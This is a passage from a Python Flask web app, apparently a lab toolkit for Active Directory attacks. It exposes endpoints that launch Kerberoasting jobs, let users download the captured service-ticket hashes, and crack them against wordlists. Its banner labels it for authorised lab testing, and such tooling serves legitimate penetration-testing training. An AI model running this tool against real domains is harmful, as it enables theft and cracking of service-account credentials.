        return jsonify(error="impacket is not available on the server: %s" % IMPORT_ERROR), 500
    data = request.get_json(silent=True) or request.form.to_dict()
    params, err = _validate(data)
    if err:
        return jsonify(error=err), 400
    job_id = uuid.uuid4().hex
    with _JOBS_LOCK:
        _JOBS[job_id] = {"state": "running", "result": None}
    threading.Thread(target=_worker, args=(job_id, params), daemon=True).start()
    return jsonify(job_id=job_id)


@app.route("/api/status/<job_id>")
def api_status(job_id):
    with _JOBS_LOCK:
        job = _JOBS.get(job_id)
    if job is None:
        return jsonify(error="Unknown job id"), 404
    resp = {"state": job["state"]}
    if job["result"] is not None:
        r = job["result"]
        resp.update({"ok": r.get("ok"), "results": r.get("results", []), "hashes": r.get("hashes", []),
                     "saved_tickets": r.get("saved_tickets", []), "log": r.get("log", []), "error": r.get("error")})
    return jsonify(resp)


@app.route("/api/download/<job_id>")
def api_download(job_id):
    with _JOBS_LOCK:
        job = _JOBS.get(job_id)
    if job is None or job.get("result") is None:
        abort(404)
    hashes = job["result"].get("hashes", [])
    if not hashes:
        abort(404)
    body = "\n".join(hashes) + "\n"
    return Response(body, mimetype="text/plain",
                    headers={"Content-Disposition": "attachment; filename=kerberoast_hashes.txt"})


@app.route("/api/crack", methods=["POST"])
def api_crack():
    if not IMPACKET_OK:
        return jsonify(error="impacket is not available on the server: %s" % IMPORT_ERROR), 500
    data = request.get_json(silent=True) or {}
    hashes = data.get("hashes") or []
    if not isinstance(hashes, list) or not hashes:
        return jsonify(error="No hashes to crack - run a roast first."), 400
    wordlist = data.get("wordlist", "") or ""
    wordlist_path = (data.get("wordlist_path", "") or "").strip()
    if not wordlist.strip() and not wordlist_path:
        return jsonify(error="Provide a wordlist: paste words or give a server-side path."), 400
    try:
        cap = int(data.get("max_words") or 2000000)
    except (TypeError, ValueError):
        cap = 2000000

    job_id = uuid.uuid4().hex
    with _JOBS_LOCK:
        _JOBS[job_id] = {"state": "running", "result": None, "progress": {"tried": 0, "found": 0}}
    threading.Thread(target=_crack_worker,
                     args=(job_id, hashes, wordlist, wordlist_path, cap), daemon=True).start()
    return jsonify(job_id=job_id)


@app.route("/api/crack_status/<job_id>")
def api_crack_status(job_id):
    with _JOBS_LOCK:
        job = _JOBS.get(job_id)
    if job is None:
        return jsonify(error="Unknown job id"), 404
    resp = {"state": job["state"], "progress": job.get("progress", {})}
    if job.get("result") is not None:
        r = job["result"]
        resp.update({"ok": r.get("ok"), "cracked": r.get("cracked", []),
                     "unsupported": r.get("unsupported", []), "tried": r.get("tried", 0),
                     "total": r.get("total", 0), "log": r.get("log", []), "error": r.get("error")})
    return jsonify(resp)


def main():
    parser = argparse.ArgumentParser(description="Single-file AD Kerberos lab toolkit (recon + kerberoast + chain reference).")
    parser.add_argument("--host", default=os.environ.get("HOST", "127.0.0.1"), help="Bind address (default 127.0.0.1).")
    parser.add_argument("--port", type=int, default=int(os.environ.get("PORT", "5000")), help="Port (default 5000).")
    parser.add_argument("--debug", action="store_true", help="Run Flask in debug mode.")
    args = parser.parse_args()

    print("=" * 70)
    print(" Kerberos Kill Chain - Lab Toolkit  (recon + kerberoast + reference)")
    print(" LAB ONLY - authorised testing only.  http://%s:%d" % (args.host, args.port))
    if IMPORT_ERROR:
        print(" [!] impacket import failed: %s" % IMPORT_ERROR)
        print("     pip install flask impacket")
    print("=" * 70)
    app.run(host=args.host, port=args.port, threaded=True, debug=args.debug)


if __name__ == "__main__":
    main()
